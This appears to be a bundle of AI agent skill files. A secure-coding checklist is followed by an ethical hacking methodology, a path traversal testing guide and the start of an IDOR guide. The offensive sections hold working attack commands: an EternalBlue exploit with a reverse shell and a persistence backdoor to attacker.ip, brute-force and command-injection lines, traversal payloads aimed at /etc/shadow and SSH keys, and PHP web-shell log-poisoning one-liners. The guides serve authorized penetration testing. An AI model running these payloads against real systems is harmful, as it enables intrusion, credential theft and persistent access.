  const maxSize = 5 * 1024 * 1024
  if (file.size > maxSize) {
    throw new Error('File too large (max 5MB)')
  }

  // Type check
  const allowedTypes = ['image/jpeg', 'image/png', 'image/gif']
  if (!allowedTypes.includes(file.type)) {
    throw new Error('Invalid file type')
  }

  // Extension check
  const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif']
  const extension = file.name.toLowerCase().match(/\.[^.]+$/)?.[0]
  if (!extension || !allowedExtensions.includes(extension)) {
    throw new Error('Invalid file extension')
  }

  return true
}
```

#### Verification Steps
- [ ] All user inputs validated with schemas
- [ ] File uploads restricted (size, type, extension)
- [ ] No direct use of user input in queries
- [ ] Whitelist validation (not blacklist)
- [ ] Error messages don't leak sensitive info

### 3. SQL Injection Prevention

#### ❌ NEVER Concatenate SQL
```typescript
// DANGEROUS - SQL Injection vulnerability
const query = `SELECT * FROM users WHERE email = '${userEmail}'`
await db.query(query)
```

#### ✅ ALWAYS Use Parameterized Queries
```typescript
// Safe - parameterized query
const { data } = await supabase
  .from('users')
  .select('*')
  .eq('email', userEmail)

// Or with raw SQL
await db.query(
  'SELECT * FROM users WHERE email = $1',
  [userEmail]
)
```

#### Verification Steps
- [ ] All database queries use parameterized queries
- [ ] No string concatenation in SQL
- [ ] ORM/query builder used correctly
- [ ] Supabase queries properly sanitized

### 4. Authentication & Authorization

#### JWT Token Handling
```typescript
// ❌ WRONG: localStorage (vulnerable to XSS)
localStorage.setItem('token', token)

// ✅ CORRECT: httpOnly cookies
res.setHeader('Set-Cookie',
  `token=${token}; HttpOnly; Secure; SameSite=Strict; Max-Age=3600`)
```

#### Authorization Checks
```typescript
export async function deleteUser(userId: string, requesterId: string) {
  // ALWAYS verify authorization first
  const requester = await db.users.findUnique({
    where: { id: requesterId }
  })

  if (requester.role !== 'admin') {
    return NextResponse.json(
      { error: 'Unauthorized' },
      { status: 403 }
    )
  }

  // Proceed with deletion
  await db.users.delete({ where: { id: userId } })
}
```

#### Row Level Security (Supabase)
```sql
-- Enable RLS on all tables
ALTER TABLE users ENABLE ROW LEVEL SECURITY;

-- Users can only view their own data
CREATE POLICY "Users view own data"
  ON users FOR SELECT
  USING (auth.uid() = id);

-- Users can only update their own data
CREATE POLICY "Users update own data"
  ON users FOR UPDATE
  USING (auth.uid() = id);
```

#### Verification Steps
- [ ] Tokens stored in httpOnly cookies (not localStorage)
- [ ] Authorization checks before sensitive operations
- [ ] Row Level Security enabled in Supabase
- [ ] Role-based access control implemented
- [ ] Session management secure

### 5. XSS Prevention

#### Sanitize HTML
```typescript
import DOMPurify from 'isomorphic-dompurify'

// ALWAYS sanitize user-provided HTML
function renderUserContent(html: string) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p'],
    ALLOWED_ATTR: []
  })
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}
```

#### Content Security Policy
```typescript
// next.config.js
const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: `
      default-src 'self';
      script-src 'self' 'unsafe-eval' 'unsafe-inline';
      style-src 'self' 'unsafe-inline';
      img-src 'self' data: https:;
      font-src 'self';
      connect-src 'self' https://api.example.com;
    `.replace(/\s{2,}/g, ' ').trim()
  }
]
```

#### Verification Steps
- [ ] User-provided HTML sanitized
- [ ] CSP headers configured
- [ ] No unvalidated dynamic content rendering
- [ ] React's built-in XSS protection used

### 6. CSRF Protection

#### CSRF Tokens
```typescript
import { csrf } from '@/lib/csrf'

export async function POST(request: Request) {
  const token = request.headers.get('X-CSRF-Token')

  if (!csrf.verify(token)) {
    return NextResponse.json(
      { error: 'Invalid CSRF token' },
      { status: 403 }
    )
  }

  // Process request
}
```

#### SameSite Cookies
```typescript
res.setHeader('Set-Cookie',
  `session=${sessionId}; HttpOnly; Secure; SameSite=Strict`)
```

#### Verification Steps
- [ ] CSRF tokens on state-changing operations
- [ ] SameSite=Strict on all cookies
- [ ] Double-submit cookie pattern implemented

### 7. Rate Limiting

#### API Rate Limiting
```typescript
import rateLimit from 'express-rate-limit'

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // 100 requests per window
  message: 'Too many requests'
})

// Apply to routes
app.use('/api/', limiter)
```

#### Expensive Operations
```typescript
// Aggressive rate limiting for searches
const searchLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 10, // 10 requests per minute
  message: 'Too many search requests'
})

app.use('/api/search', searchLimiter)
```

#### Verification Steps
- [ ] Rate limiting on all API endpoints
- [ ] Stricter limits on expensive operations
- [ ] IP-based rate limiting
- [ ] User-based rate limiting (authenticated)

### 8. Sensitive Data Exposure

#### Logging
```typescript
// ❌ WRONG: Logging sensitive data
console.log('User login:', { email, password })
console.log('Payment:', { cardNumber, cvv })

// ✅ CORRECT: Redact sensitive data
console.log('User login:', { email, userId })
console.log('Payment:', { last4: card.last4, userId })
```

#### Error Messages
```typescript
// ❌ WRONG: Exposing internal details
catch (error) {
  return NextResponse.json(
    { error: error.message, stack: error.stack },
    { status: 500 }
  )
}

// ✅ CORRECT: Generic error messages
catch (error) {
  console.error('Internal error:', error)
  return NextResponse.json(
    { error: 'An error occurred. Please try again.' },
    { status: 500 }
  )
}
```

#### Verification Steps
- [ ] No passwords, tokens, or secrets in logs
- [ ] Error messages generic for users
- [ ] Detailed errors only in server logs
- [ ] No stack traces exposed to users

### 9. Blockchain Security (Solana)

#### Wallet Verification
```typescript
import { verify } from '@solana/web3.js'

async function verifyWalletOwnership(
  publicKey: string,
  signature: string,
  message: string
) {
  try {
    const isValid = verify(
      Buffer.from(message),
      Buffer.from(signature, 'base64'),
      Buffer.from(publicKey, 'base64')
    )
    return isValid
  } catch (error) {
    return false
  }
}
```

#### Transaction Verification
```typescript
async function verifyTransaction(transaction: Transaction) {
  // Verify recipient
  if (transaction.to !== expectedRecipient) {
    throw new Error('Invalid recipient')
  }

  // Verify amount
  if (transaction.amount > maxAmount) {
    throw new Error('Amount exceeds limit')
  }

  // Verify user has sufficient balance
  const balance = await getBalance(transaction.from)
  if (balance < transaction.amount) {
    throw new Error('Insufficient balance')
  }

  return true
}
```

#### Verification Steps
- [ ] Wallet signatures verified
- [ ] Transaction details validated
- [ ] Balance checks before transactions
- [ ] No blind transaction signing

### 10. Dependency Security

#### Regular Updates
```bash
# Check for vulnerabilities
npm audit

# Fix automatically fixable issues
npm audit fix

# Update dependencies
npm update

# Check for outdated packages
npm outdated
```

#### Lock Files
```bash
# ALWAYS commit lock files
git add package-lock.json

# Use in CI/CD for reproducible builds
npm ci  # Instead of npm install
```

#### Verification Steps
- [ ] Dependencies up to date
- [ ] No known vulnerabilities (npm audit clean)
- [ ] Lock files committed
- [ ] Dependabot enabled on GitHub
- [ ] Regular security updates

## Security Testing

### Automated Security Tests
```typescript
// Test authentication
test('requires authentication', async () => {
  const response = await fetch('/api/protected')
  expect(response.status).toBe(401)
})

// Test authorization
test('requires admin role', async () => {
  const response = await fetch('/api/admin', {
    headers: { Authorization: `Bearer ${userToken}` }
  })
  expect(response.status).toBe(403)
})

// Test input validation
test('rejects invalid input', async () => {
  const response = await fetch('/api/users', {
    method: 'POST',
    body: JSON.stringify({ email: 'not-an-email' })
  })
  expect(response.status).toBe(400)
})

// Test rate limiting
test('enforces rate limits', async () => {
  const requests = Array(101).fill(null).map(() =>
    fetch('/api/endpoint')
  )

  const responses = await Promise.all(requests)
  const tooManyRequests = responses.filter(r => r.status === 429)

  expect(tooManyRequests.length).toBeGreaterThan(0)
})
```

## Pre-Deployment Security Checklist

Before ANY production deployment:

- [ ] **Secrets**: No hardcoded secrets, all in env vars
- [ ] **Input Validation**: All user inputs validated
- [ ] **SQL Injection**: All queries parameterized
- [ ] **XSS**: User content sanitized
- [ ] **CSRF**: Protection enabled
- [ ] **Authentication**: Proper token handling
- [ ] **Authorization**: Role checks in place
- [ ] **Rate Limiting**: Enabled on all endpoints
- [ ] **HTTPS**: Enforced in production
- [ ] **Security Headers**: CSP, X-Frame-Options configured
- [ ] **Error Handling**: No sensitive data in errors
- [ ] **Logging**: No sensitive data logged
- [ ] **Dependencies**: Up to date, no vulnerabilities
- [ ] **Row Level Security**: Enabled in Supabase
- [ ] **CORS**: Properly configured
- [ ] **File Uploads**: Validated (size, type)
- [ ] **Wallet Signatures**: Verified (if blockchain)

## Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Next.js Security](https://nextjs.org/docs/security)
- [Supabase Security](https://supabase.com/docs/guides/auth)
- [Web Security Academy](https://portswigger.net/web-security)

---

**Remember**: Security is not optional. One vulnerability can compromise the entire platform. When in doubt, err on the side of caution.

---

<a id="ethicalhackingmethodology"></a>

## Ethical Hacking Methodology

---
name: Ethical Hacking Methodology
description: This skill should be used when the user asks to "learn ethical hacking", "understand penetration testing lifecycle", "perform reconnaissance", "conduct security scanning", "exploit vulnerabilities", or "write penetration test reports". It provides comprehensive ethical hacking methodology and techniques.
metadata:
  author: zebbern
  version: "1.1"
---

# Ethical Hacking Methodology

## Purpose

Master the complete penetration testing lifecycle from reconnaissance through reporting. This skill covers the five stages of ethical hacking methodology, essential tools, attack techniques, and professional reporting for authorized security assessments.

## Prerequisites

### Required Environment
- Kali Linux installed (persistent or live)
- Network access to authorized targets
- Written authorization from system owner

### Required Knowledge
- Basic networking concepts
- Linux command-line proficiency
- Understanding of web technologies
- Familiarity with security concepts

## Outputs and Deliverables

1. **Reconnaissance Report** - Target information gathered
2. **Vulnerability Assessment** - Identified weaknesses
3. **Exploitation Evidence** - Proof of concept attacks
4. **Final Report** - Executive and technical findings

## Core Workflow

### Phase 1: Understanding Hacker Types

Classification of security professionals:

**White Hat Hackers (Ethical Hackers)**
- Authorized security professionals
- Conduct penetration testing with permission
- Goal: Identify and fix vulnerabilities
- Also known as: penetration testers, security consultants

**Black Hat Hackers (Malicious)**
- Unauthorized system intrusions
- Motivated by profit, revenge, or notoriety
- Goal: Steal data, cause damage
- Also known as: crackers, criminal hackers

**Grey Hat Hackers (Hybrid)**
- May cross ethical boundaries
- Not malicious but may break rules
- Often disclose vulnerabilities publicly
- Mixed motivations

**Other Classifications**
- **Script Kiddies**: Use pre-made tools without understanding
- **Hacktivists**: Politically or socially motivated
- **Nation State**: Government-sponsored operatives
- **Coders**: Develop tools and exploits

### Phase 2: Reconnaissance

Gather information without direct system interaction:

**Passive Reconnaissance**
```bash
# WHOIS lookup
whois target.com

# DNS enumeration
nslookup target.com
dig target.com ANY
dig target.com MX
dig target.com NS

# Subdomain discovery
dnsrecon -d target.com

# Email harvesting
theHarvester -d target.com -b all
```

**Google Hacking (OSINT)**
```
# Find exposed files
site:target.com filetype:pdf
site:target.com filetype:xls
site:target.com filetype:doc

# Find login pages
site:target.com inurl:login
site:target.com inurl:admin

# Find directory listings
site:target.com intitle:"index of"

# Find configuration files
site:target.com filetype:config
site:target.com filetype:env
```

**Google Hacking Database Categories:**
- Files containing passwords
- Sensitive directories
- Web server detection
- Vulnerable servers
- Error messages
- Login portals

**Social Media Reconnaissance**
- LinkedIn: Organizational charts, technologies used
- Twitter: Company announcements, employee info
- Facebook: Personal information, relationships
- Job postings: Technology stack revelations

### Phase 3: Scanning

Active enumeration of target systems:

**Host Discovery**
```bash
# Ping sweep
nmap -sn 192.168.1.0/24

# ARP scan (local network)
arp-scan -l

# Discover live hosts
nmap -sP 192.168.1.0/24
```

**Port Scanning**
```bash
# TCP SYN scan (stealth)
nmap -sS target.com

# Full TCP connect scan
nmap -sT target.com

# UDP scan
nmap -sU target.com

# All ports scan
nmap -p- target.com

# Top 1000 ports with service detection
nmap -sV target.com

# Aggressive scan (OS, version, scripts)
nmap -A target.com
```

**Service Enumeration**
```bash
# Specific service scripts
nmap --script=http-enum target.com
nmap --script=smb-enum-shares target.com
nmap --script=ftp-anon target.com

# Vulnerability scanning
nmap --script=vuln target.com
```

**Common Port Reference**
| Port | Service | Notes |
|------|---------|-------|
| 21 | FTP | File transfer |
| 22 | SSH | Secure shell |
| 23 | Telnet | Unencrypted remote |
| 25 | SMTP | Email |
| 53 | DNS | Name resolution |
| 80 | HTTP | Web |
| 443 | HTTPS | Secure web |
| 445 | SMB | Windows shares |
| 3306 | MySQL | Database |
| 3389 | RDP | Remote desktop |

### Phase 4: Vulnerability Analysis

Identify exploitable weaknesses:

**Automated Scanning**
```bash
# Nikto web scanner
nikto -h http://target.com

# OpenVAS (command line)
omp -u admin -w password --xml="<get_tasks/>"

# Nessus (via API)
nessuscli scan --target target.com
```

**Web Application Testing (OWASP)**
- SQL Injection
- Cross-Site Scripting (XSS)
- Broken Authentication
- Security Misconfiguration
- Sensitive Data Exposure
- XML External Entities (XXE)
- Broken Access Control
- Insecure Deserialization
- Using Components with Known Vulnerabilities
- Insufficient Logging & Monitoring

**Manual Techniques**
```bash
# Directory brute forcing
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Subdomain enumeration
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt

# Web technology fingerprinting
whatweb target.com
```

### Phase 5: Exploitation

Actively exploit discovered vulnerabilities:

**Metasploit Framework**
```bash
# Start Metasploit
msfconsole

# Search for exploits
msf> search type:exploit name:smb

# Use specific exploit
msf> use exploit/windows/smb/ms17_010_eternalblue

# Set target
msf> set RHOSTS target.com

# Set payload
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LHOST attacker.ip

# Execute
msf> exploit
```

**Password Attacks**
```bash
# Hydra brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com
hydra -L users.txt -P passwords.txt ftp://target.com

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Web Exploitation**
```bash
# SQLMap for SQL injection
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database --tables

# XSS testing
# Manual: <script>alert('XSS')</script>

# Command injection testing
# ; ls -la
# | cat /etc/passwd
```

### Phase 6: Maintaining Access

Establish persistent access:

**Backdoors**
```bash
# Meterpreter persistence
meterpreter> run persistence -X -i 30 -p 4444 -r attacker.ip

# SSH key persistence
# Add attacker's public key to ~/.ssh/authorized_keys

# Cron job persistence
echo "* * * * * /tmp/backdoor.sh" >> /etc/crontab
```

**Privilege Escalation**
```bash
# Linux enumeration
linpeas.sh
linux-exploit-suggester.sh

# Windows enumeration
winpeas.exe
windows-exploit-suggester.py

# Check SUID binaries (Linux)
find / -perm -4000 2>/dev/null

# Check sudo permissions
sudo -l
```

**Covering Tracks (Ethical Context)**
- Document all actions taken
- Maintain logs for reporting
- Avoid unnecessary system changes
- Clean up test files and backdoors

### Phase 7: Reporting

Document findings professionally:

**Report Structure**
1. **Executive Summary**
   - High-level findings
   - Business impact
   - Risk ratings
   - Remediation priorities

2. **Technical Findings**
   - Vulnerability details
   - Proof of concept
   - Screenshots/evidence
   - Affected systems

3. **Risk Ratings**
   - Critical: Immediate action required
   - High: Address within 24-48 hours
   - Medium: Address within 1 week
   - Low: Address within 1 month
   - Informational: Best practice recommendations

4. **Remediation Recommendations**
   - Specific fixes for each finding
   - Short-term mitigations
   - Long-term solutions
   - Resource requirements

5. **Appendices**
   - Detailed scan outputs
   - Tool configurations
   - Testing timeline
   - Scope and methodology

### Phase 8: Common Attack Types

**Phishing**
- Email-based credential theft
- Fake login pages
- Malicious attachments
- Social engineering component

**Malware Types**
- **Virus**: Self-replicating, needs host file
- **Worm**: Self-propagating across networks
- **Trojan**: Disguised as legitimate software
- **Ransomware**: Encrypts files for ransom
- **Rootkit**: Hidden system-level access
- **Spyware**: Monitors user activity

**Network Attacks**
- Man-in-the-Middle (MITM)
- ARP Spoofing
- DNS Poisoning
- DDoS (Distributed Denial of Service)

### Phase 9: Kali Linux Setup

Install penetration testing platform:

**Hard Disk Installation**
1. Download ISO from kali.org
2. Boot from installation media
3. Select "Graphical Install"
4. Configure language, location, keyboard
5. Set hostname and root password
6. Partition disk (Guided - use entire disk)
7. Install GRUB bootloader
8. Reboot and login

**Live USB (Persistent)**
```bash
# Create bootable USB
dd if=kali-linux.iso of=/dev/sdb bs=512k status=progress

# Create persistence partition
gparted /dev/sdb
# Add ext4 partition labeled "persistence"

# Configure persistence
mkdir /mnt/usb
mount /dev/sdb2 /mnt/usb
echo "/ union" > /mnt/usb/persistence.conf
umount /mnt/usb
```

### Phase 10: Ethical Guidelines

**Legal Requirements**
- Obtain written authorization
- Define scope clearly
- Document all testing activities
- Report all findings to client
- Maintain confidentiality

**Professional Conduct**
- Work ethically with integrity
- Respect privacy of data accessed
- Avoid unnecessary system damage
- Execute planned tests only
- Never use findings for personal gain

## Quick Reference

### Penetration Testing Lifecycle

| Stage | Purpose | Key Tools |
|-------|---------|-----------|
| Reconnaissance | Gather information | theHarvester, WHOIS, Google |
| Scanning | Enumerate targets | Nmap, Nikto, Gobuster |
| Exploitation | Gain access | Metasploit, SQLMap, Hydra |
| Maintaining Access | Persistence | Meterpreter, SSH keys |
| Reporting | Document findings | Report templates |

### Essential Commands

| Command | Purpose |
|---------|---------|
| `nmap -sV target` | Port and service scan |
| `nikto -h target` | Web vulnerability scan |
| `msfconsole` | Start Metasploit |
| `hydra -l user -P list ssh://target` | SSH brute force |
| `sqlmap -u "url?id=1" --dbs` | SQL injection |

## Constraints and Limitations

### Authorization Required
- Never test without written permission
- Stay within defined scope
- Report unauthorized access attempts

### Professional Standards
- Follow rules of engagement
- Maintain client confidentiality
- Document methodology used
- Provide actionable recommendations

## Troubleshooting

### Scans Blocked

**Solutions:**
1. Use slower scan rates
2. Try different scanning techniques
3. Use proxy or VPN
4. Fragment packets

### Exploits Failing

**Solutions:**
1. Verify target vulnerability exists
2. Check payload compatibility
3. Adjust exploit parameters
4. Try alternative exploits


---

<a id="filepathtraversal"></a>

## File Path Traversal

---
name: File Path Traversal Testing
description: This skill should be used when the user asks to "test for directory traversal", "exploit path traversal vulnerabilities", "read arbitrary files through web applications", "find LFI vulnerabilities", or "access files outside web root". It provides comprehensive file path traversal attack and testing methodologies.
metadata:
  author: zebbern
  version: "1.1"
---

# File Path Traversal Testing

## Purpose

Identify and exploit file path traversal (directory traversal) vulnerabilities that allow attackers to read arbitrary files on the server, potentially including sensitive configuration files, credentials, and source code. This vulnerability occurs when user-controllable input is passed to filesystem APIs without proper validation.

## Prerequisites

### Required Tools
- Web browser with developer tools
- Burp Suite or OWASP ZAP
- cURL for testing payloads
- Wordlists for automation
- ffuf or wfuzz for fuzzing

### Required Knowledge
- HTTP request/response structure
- Linux and Windows filesystem layout
- Web application architecture
- Basic understanding of file APIs

## Outputs and Deliverables

1. **Vulnerability Report** - Identified traversal points and severity
2. **Exploitation Proof** - Extracted file contents
3. **Impact Assessment** - Accessible files and data exposure
4. **Remediation Guidance** - Secure coding recommendations

## Core Workflow

### Phase 1: Understanding Path Traversal

Path traversal occurs when applications use user input to construct file paths:

```php
// Vulnerable PHP code example
$template = "blue.php";
if (isset($_COOKIE['template']) && !empty($_COOKIE['template'])) {
    $template = $_COOKIE['template'];
}
include("/home/user/templates/" . $template);
```

Attack principle:
- `../` sequence moves up one directory
- Chain multiple sequences to reach root
- Access files outside intended directory

Impact:
- **Confidentiality** - Read sensitive files
- **Integrity** - Write/modify files (in some cases)
- **Availability** - Delete files (in some cases)
- **Code Execution** - If combined with file upload or log poisoning

### Phase 2: Identifying Traversal Points

Map application for potential file operations:

```bash
# Parameters that often handle files
?file=
?path=
?page=
?template=
?filename=
?doc=
?document=
?folder=
?dir=
?include=
?src=
?source=
?content=
?view=
?download=
?load=
?read=
?retrieve=
```

Common vulnerable functionality:
- Image loading: `/image?filename=23.jpg`
- Template selection: `?template=blue.php`
- File downloads: `/download?file=report.pdf`
- Document viewers: `/view?doc=manual.pdf`
- Include mechanisms: `?page=about`

### Phase 3: Basic Exploitation Techniques

#### Simple Path Traversal

```bash
# Basic Linux traversal
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd

# Windows traversal
..\..\..\windows\win.ini
..\..\..\..\windows\system32\drivers\etc\hosts

# URL encoded
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd  # Double encoding

# Test payloads with curl
curl "http://target.com/image?filename=../../../etc/passwd"
curl "http://target.com/download?file=....//....//....//etc/passwd"
```

#### Absolute Path Injection

```bash
# Direct absolute path (Linux)
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ

# Direct absolute path (Windows)
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\boot.ini
```

### Phase 4: Bypass Techniques

#### Bypass Stripped Traversal Sequences

```bash
# When ../ is stripped once
....//....//....//etc/passwd
....\/....\/....\/etc/passwd

# Nested traversal
..././..././..././etc/passwd
....//....//etc/passwd

# Mixed encoding
..%2f..%2f..%2fetc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

#### Bypass Extension Validation

```bash
# Null byte injection (older PHP versions)
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png

# Path truncation
../../../etc/passwd...............................

# Double extension
../../../etc/passwd.jpg.php
```

#### Bypass Base Directory Validation

```bash
# When path must start with expected directory
/var/www/images/../../../etc/passwd

# Expected path followed by traversal
images/../../../etc/passwd
```

#### Bypass Blacklist Filters

```bash
# Unicode/UTF-8 encoding
..%c0%af..%c0%af..%c0%afetc/passwd
..%c1%9c..%c1%9c..%c1%9cetc/passwd

# Overlong UTF-8 encoding
%c0%2e%c0%2e%c0%af

# URL encoding variations
%2e%2e/
%2e%2e%5c
..%5c
..%255c

# Case variations (Windows)
....\\....\\etc\\passwd
```

### Phase 5: Linux Target Files

High-value files to target:

```bash
# System files
/etc/passwd           # User accounts
/etc/shadow           # Password hashes (root only)
/etc/group            # Group information
/etc/hosts            # Host mappings
/etc/hostname         # System hostname
/etc/issue            # System banner

# SSH files
/root/.ssh/id_rsa           # Root private key
/root/.ssh/authorized_keys  # Authorized keys
/home/<user>/.ssh/id_rsa    # User private keys
/etc/ssh/sshd_config        # SSH configuration

# Web server files
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/apache2/sites-enabled/000-default.conf
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log

# Application files
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/.htaccess
/var/www/html/web.config

# Process information
/proc/self/environ      # Environment variables
/proc/self/cmdline      # Process command line
/proc/self/fd/0         # File descriptors
/proc/version           # Kernel version

# Common application configs
/etc/mysql/my.cnf
/etc/postgresql/*/postgresql.conf
/opt/lampp/etc/httpd.conf
```

### Phase 6: Windows Target Files

Windows-specific targets:

```bash
# System files
C:\windows\win.ini
C:\windows\system.ini
C:\boot.ini
C:\windows\system32\drivers\etc\hosts
C:\windows\system32\config\SAM
C:\windows\repair\SAM

# IIS files
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\W3SVC1\

# Configuration files
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\data\mysql\user.MYD
C:\xampp\passwords.txt
C:\xampp\phpmyadmin\config.inc.php

# User files
C:\Users\<user>\.ssh\id_rsa
C:\Users\<user>\Desktop\
C:\Documents and Settings\<user>\
```

### Phase 7: Automated Testing

#### Using Burp Suite

```
1. Capture request with file parameter
2. Send to Intruder
3. Mark file parameter value as payload position
4. Load path traversal wordlist
5. Start attack
6. Filter responses by size/content for success
```

#### Using ffuf

```bash
# Basic traversal fuzzing
ffuf -u "http://target.com/image?filename=FUZZ" \
     -w /usr/share/wordlists/traversal.txt \
     -mc 200

# Fuzzing with encoding
ffuf -u "http://target.com/page?file=FUZZ" \
     -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
     -mc 200,500 -ac
```

#### Using wfuzz

```bash
# Traverse to /etc/passwd
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
      --hc 404 \
      "http://target.com/index.php?file=FUZZ"

# With headers/cookies
wfuzz -c -z file,traversal.txt \
      -H "Cookie: session=abc123" \
      "http://target.com/load?path=FUZZ"
```

### Phase 8: LFI to RCE Escalation

#### Log Poisoning

```bash
# Inject PHP code into logs
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Include Apache log file
curl "http://target.com/page?file=../../../var/log/apache2/access.log&cmd=id"

# Include auth.log (SSH)
# First: ssh '<?php system($_GET["cmd"]); ?>'@target.com
curl "http://target.com/page?file=../../../var/log/auth.log&cmd=whoami"
```

#### Proc/self/environ

```bash
# Inject via User-Agent
curl -A "<?php system('id'); ?>" \
     "http://target.com/page?file=/proc/self/environ"

# With command parameter
curl -A "<?php system(\$_GET['c']); ?>" \
     "http://target.com/page?file=/proc/self/environ&c=whoami"
```

#### PHP Wrapper Exploitation

```bash
# php://filter - Read source code as base64
curl "http://target.com/page?file=php://filter/convert.base64-encode/resource=config.php"

# php://input - Execute POST data as PHP
curl -X POST -d "<?php system('id'); ?>" \
     "http://target.com/page?file=php://input"

# data:// - Execute inline PHP
curl "http://target.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id"

# expect:// - Execute system commands
curl "http://target.com/page?file=expect://id"
```

### Phase 9: Testing Methodology

Structured testing approach:

```bash
# Step 1: Identify potential parameters
# Look for file-related functionality

# Step 2: Test basic traversal
../../../etc/passwd

# Step 3: Test encoding variations
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Step 4: Test bypass techniques
....//....//....//etc/passwd
..;/..;/..;/etc/passwd

# Step 5: Test absolute paths
/etc/passwd

# Step 6: Test with null bytes (legacy)
../../../etc/passwd%00.jpg

# Step 7: Attempt wrapper exploitation
php://filter/convert.base64-encode/resource=index.php

# Step 8: Attempt log poisoning for RCE
```

### Phase 10: Prevention Measures

Secure coding practices:

```php
// PHP: Use basename() to strip paths
$filename = basename($_GET['file']);
$path = "/var/www/files/" . $filename;

// PHP: Validate against whitelist
$allowed = ['report.pdf', 'manual.pdf', 'guide.pdf'];
if (in_array($_GET['file'], $allowed)) {
    include("/var/www/files/" . $_GET['file']);
}

// PHP: Canonicalize and verify base path
$base = "/var/www/files/";
$realBase = realpath($base);
$userPath = $base . $_GET['file'];
$realUserPath = realpath($userPath);

if ($realUserPath && strpos($realUserPath, $realBase) === 0) {
    include($realUserPath);
}
```

```python
# Python: Use os.path.realpath() and validate
import os

def safe_file_access(base_dir, filename):
    # Resolve to absolute path
    base = os.path.realpath(base_dir)
    file_path = os.path.realpath(os.path.join(base, filename))

    # Verify file is within base directory
    if file_path.startswith(base):
        return open(file_path, 'r').read()
    else:
        raise Exception("Access denied")
```

## Quick Reference

### Common Payloads

| Payload | Target |
|---------|--------|
| `../../../etc/passwd` | Linux password file |
| `..\..\..\..\windows\win.ini` | Windows INI file |
| `....//....//....//etc/passwd` | Bypass simple filter |
| `/etc/passwd` | Absolute path |
| `php://filter/convert.base64-encode/resource=config.php` | Source code |

### Target Files

| OS | File | Purpose |
|----|------|---------|
| Linux | `/etc/passwd` | User accounts |
| Linux | `/etc/shadow` | Password hashes |
| Linux | `/proc/self/environ` | Environment vars |
| Windows | `C:\windows\win.ini` | System config |
| Windows | `C:\boot.ini` | Boot config |
| Web | `wp-config.php` | WordPress DB creds |

### Encoding Variants

| Type | Example |
|------|---------|
| URL Encoding | `%2e%2e%2f` = `../` |
| Double Encoding | `%252e%252e%252f` = `../` |
| Unicode | `%c0%af` = `/` |
| Null Byte | `%00` |

## Constraints and Limitations

### Permission Restrictions
- Cannot read files application user cannot access
- Shadow file requires root privileges
- Many files have restrictive permissions

### Application Restrictions
- Extension validation may limit file types
- Base path validation may restrict scope
- WAF may block common payloads

### Testing Considerations
- Respect authorized scope
- Avoid accessing genuinely sensitive data
- Document all successful access

## Troubleshooting

| Problem | Solutions |
|---------|-----------|
| No response difference | Try encoding, blind traversal, different files |
| Payload blocked | Use encoding variants, nested sequences, case variations |
| Cannot escalate to RCE | Check logs, PHP wrappers, file upload, session poisoning |


---

<a id="idortesting"></a>

## Idor Testing

---
name: IDOR Vulnerability Testing
description: This skill should be used when the user asks to "test for insecure direct object references," "find IDOR vulnerabilities," "exploit broken access control," "enumerate user IDs or object references," or "bypass authorization to access other users' data." It provides comprehensive guidance for detecting, exploiting, and remediating IDOR vulnerabilities in web applications.
metadata:
  author: zebbern
  version: "1.1"
---

# IDOR Vulnerability Testing

## Purpose

Provide systematic methodologies for identifying and exploiting Insecure Direct Object Reference (IDOR) vulnerabilities in web applications. This skill covers both database object references and static file references, detection techniques using parameter manipulation and enumeration, exploitation via Burp Suite, and remediation strategies for securing applications against unauthorized access.

## Inputs / Prerequisites

- **Target Web Application**: URL of application with user-specific resources
- **Multiple User Accounts**: At least two test accounts to verify cross-user access
- **Burp Suite or Proxy Tool**: Intercepting proxy for request manipulation
- **Authorization**: Written permission for security testing
- **Understanding of Application Flow**: Knowledge of how objects are referenced (IDs, filenames)

## Outputs / Deliverables

- **IDOR Vulnerability Report**: Documentation of discovered access control bypasses
- **Proof of Concept**: Evidence of unauthorized data access across user contexts
- **Affected Endpoints**: List of vulnerable API endpoints and parameters
- **Impact Assessment**: Classification of data exposure severity
- **Remediation Recommendations**: Specific fixes for identified vulnerabilities

## Core Workflow

### 1. Understand IDOR Vulnerability Types

#### Direct Reference to Database Objects
Occurs when applications reference database records via user-controllable parameters:
```
# Original URL (authenticated as User A)
example.com/user/profile?id=2023

# Manipulation attempt (accessing User B's data)
example.com/user/profile?id=2022
```

#### Direct Reference to Static Files
Occurs when applications expose file paths or names that can be enumerated:
```
# Original URL (User A's receipt)
